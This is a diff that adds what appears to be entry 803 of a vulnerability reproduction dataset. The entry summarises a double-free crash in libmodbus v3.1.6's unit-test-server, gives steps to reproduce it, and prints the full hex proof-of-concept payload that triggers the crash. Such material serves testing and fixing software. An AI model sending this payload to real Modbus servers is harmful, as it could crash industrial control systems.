@@ -1,0 +1,10 @@
+Number: 803
+
+Summarize:
+In libmodbus v3.1.6, sending a specific message to unit-test-server triggers a double-free bug. The observed result is a crash with "double free or corruption (out)". The report suggests the cause is in unit-test-server.c, where the ctx pointer is freed and then freed again in modbus_free(ctx).
+
+Reproduce:
+1. Use libmodbus v3.1.6 and run unit-test-server. 2. Send the exact PoC byte sequence from the report to unit-test-server: <00><01><1f><03><7f><40><00><17><01><6c><00><03><00><42><00><20><40><06><ee><0f><10><00><00><08><01><fa><00><00><d7><01><01><01><01><01><01><40><00><11><00><fc><00><00><40><06><ee><01><01><40><00><09><e9><fc><00><00><40><00><12><00><fc><ff><7f><00><00><ee><0f><0e><00><00><08><01><fa><00><00><d7><01><01><01><01><01><01><40><00><12><00><fc><00><00><40><06><ee><01><01><fc><ff><7f>. 3. Observe the documented crash/diagnostic: "double free or corruption (out)".
+
+Payload:
+00 01 1f 03 7f 40 00 17 01 6c 00 03 00 42 00 20 40 06 ee 0f 10 00 00 08 01 fa 00 00 d7 01 01 01 01 01 01 40 00 11 00 fc 00 00 40 06 ee 01 01 40 00 09 e9 fc 00 00 40 00 12 00 fc ff 7f 00 00 ee 0f 0e 00 00 08 01 fa 00 00 d7 01 01 01 01 01 01 40 00 12 00 fc 00 00 40 06 ee 01 01 fc ff 7f
